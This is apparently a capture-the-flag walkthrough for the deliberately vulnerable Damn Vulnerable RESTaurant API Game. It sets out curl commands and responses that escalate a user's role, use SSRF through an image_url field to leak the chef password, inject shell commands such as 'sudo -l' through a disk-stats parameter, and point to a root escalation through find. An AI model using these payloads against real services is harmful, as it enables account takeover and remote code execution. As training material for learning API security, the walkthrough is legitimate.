# DV-RESTaurant-API-Game-Solution

# create a user
```bash
curl -X POST http://192.168.1.2:8089/register \
     -H "Content-Type: application/json" \
     -d '{
           "username": "testuser",
           "password": "securepassword123",
           "first_name": "Test",
           "last_name": "User",
           "phone_number": "1234567890"
         }'
		 
{"username":"testuser","first_name":"Test","last_name":"User","phone_number":"1234567890","role":"Customer"}
```

# fetch token
```bash
curl -X POST http://192.168.1.2:8089/token \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -d "username=testuser&password=securepassword123"

{"access_token":"${TOKEN}","token_type":"bearer"}
```

# authenticate
```bash
curl -X GET http://192.168.1.2:8089/profile \
     -H "Authorization: Bearer ${TOKEN}"
```

# get profile info
```bash
curl -k -H "Authorization: Bearer ${TOKEN}" http://192.168.1.2:8089/profile

{"username":"testuser","first_name":"Test","last_name":"User","phone_number":"1234567890","role":"Customer"}
```

# determine what role is required by querying the disk endpoint
```bash
curl -k -H "Authorization: Bearer ${TOKEN}" http://192.168.1.2:8089/admin/stats/disk

{"detail":"Only Chef is authorized to get current disk stats!"}
```

# attempt to update role for testuser to Chef
```bash
curl -X PUT http://192.168.1.2:8089/users/update_role \
     -H "Authorization: Bearer ${TOKEN}" \
     -H "Content-Type: application/json" \
     -d '{
           "username": "testuser",
           "role": "Chef"
         }'

{"detail":"Only Chef is authorized to add Chef role!"}
```

# reviewed the code - [app/apis/users/service.py](https://github.com/theowni/Damn-Vulnerable-RESTaurant-API-Game/blob/main/app/apis/users/service.py#L18)
```
# this method allows staff to give Employee role to other users
# Chef role is restricted
```

# reviewed the code looks juicy - [app/apis/admin/service.py](https://github.com/theowni/Damn-Vulnerable-RESTaurant-API-Game/blob/main/app/apis/admin/service.py#L20)
```
"/admin/reset-chef-password"
```

# attempt to update role for testuser to Employee
```bash
curl -X PUT http://192.168.1.2:8089/users/update_role \
     -H "Authorization: Bearer ${TOKEN}" \
     -H "Content-Type: application/json" \
     -d '{
           "username": "testuser",
           "role": "Employee"
         }'

{"username":"testuser","role":"Employee"}
```

# validate role
```bash
curl -k -H "Authorization: Bearer ${TOKEN}" http://192.168.1.2:8089/profile

{"username":"testuser","first_name":"Test","last_name":"User","phone_number":"1234567890","role":"Employee"}
```

# attempt to update role for testuser from Employee to Chef
```bash
curl -X PUT http://192.168.1.2:8089/users/update_role \
     -H "Authorization: Bearer ${TOKEN}" \
     -H "Content-Type: application/json" \
     -d '{
           "username": "testuser",
           "role": "Chef"
         }'
{"detail":"Only Chef is authorized to add Chef role!"}
```

# craft SSRF for the /menu endpoint to hit the local /admin/reset-chef-password
```bash
curl -X PUT http://192.168.1.2:8089/menu \
    -H "Authorization: Bearer ${TOKEN}" \
    -H "Content-Type: application/json" \
    -d '{
          "name": "Item",
          "price": 0.00,
          "category": "",
          "description": "",
          "image_url": "http://localhost:8080/admin/reset-chef-password"
        }'
		
{"id":15,"name":"Item","price":0.0,"category":"","description":"","image_base64":"eyJwYXNzd29yZCI6IjErN2p3KDZhSjRUcTFBWjZhOlh6X2VXWHRRIyNBcCh0In0="}
```

# decode the string
```bash
echo 'eyJwYXNzd29yZCI6IjErN2p3KDZhSjRUcTFBWjZhOlh6X2VXWHRRIyNBcCh0In0=' | base64 --decode
{"password":"1+7jw(6aJ4Tq1AZ6a:Xz_eWXtQ##Ap(t"}
```

# fetch token as Chef
```bash
curl -X POST http://192.168.1.2:8089/token \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -d "username=chef&password=1%2B7jw%286aJ4Tq1AZ6a%3AXz_eWXtQ%23%23Ap%28t"

{"access_token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJjaGVmIiwiZXhwIjoxNzEzNTQwMTA1fQ.TQoVX_EOQKzIfjPwgJxxcGwVSfcge7QOVkNCny3wRvA","token_type":"bearer"}
```

# authenticate as chef
```bash
curl -X GET http://192.168.1.2:8089/profile \
     -H "Authorization: Bearer ${CHEF_TOKEN}"	 
	 
{"username":"chef","first_name":"Gustavo","last_name":"","phone_number":"(505) 146-0195","role":"Chef"}
```

# attempt RCE via the /admin/stats/disk endpoint
```bash
curl -k -H "Authorization: Bearer ${CHEF_TOKEN}" http://192.168.1.2:8089/admin/stats/disk?parameters=%26%26echo%20vulnerable%21
{"output":"Filesystem               Size  Used Avail Use% Mounted on\nfuse-overlayfs           149G  137G   13G  92% /\n/dev/mapper/fedora-root  149G  137G   13G  92% /app\ntmpfs                     64M     0   64M   0% /dev\ndevtmpfs                 4.0M     0  4.0M   0% /dev/mem\ntmpfs                    996M  1.2M  995M   1% /etc/hosts\nshm                       63M     0   63M   0% /dev/shm\nvulnerable!"}
```

# check for priv escalation opportunities
## check if the "app" user has any sudo capabilities that can be exploited:
```bash
curl -k -H "Authorization: Bearer ${CHEF_TOKEN}" \
"http://192.168.1.2:8089/admin/stats/disk?parameters=%26%26sudo%20-l"
{"output":"Filesystem               Size  Used Avail Use% Mounted on\nfuse-overlayfs           149G  137G   13G  92% /\n/dev/mapper/fedora-root  149G  137G   13G  92% /app\ntmpfs                     64M     0   64M   0% /dev\ndevtmpfs                 4.0M     0  4.0M   0% /dev/mem\ntmpfs                    996M  1.2M  995M   1% /etc/hosts\nshm                       63M     0   63M   0% /dev/shm\nMatching Defaults entries for app on 1847d1ddb7e1:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\n\nUser app may run the following commands on 1847d1ddb7e1:\n    (ALL) NOPASSWD: /usr/bin/find"}
```
:boom: "app" user has permission to run the /usr/bin/find command as root without a password (NOPASSWD). This is a banger of finding because the find command can be exploited to execute arbitrary commands with elevated privileges.
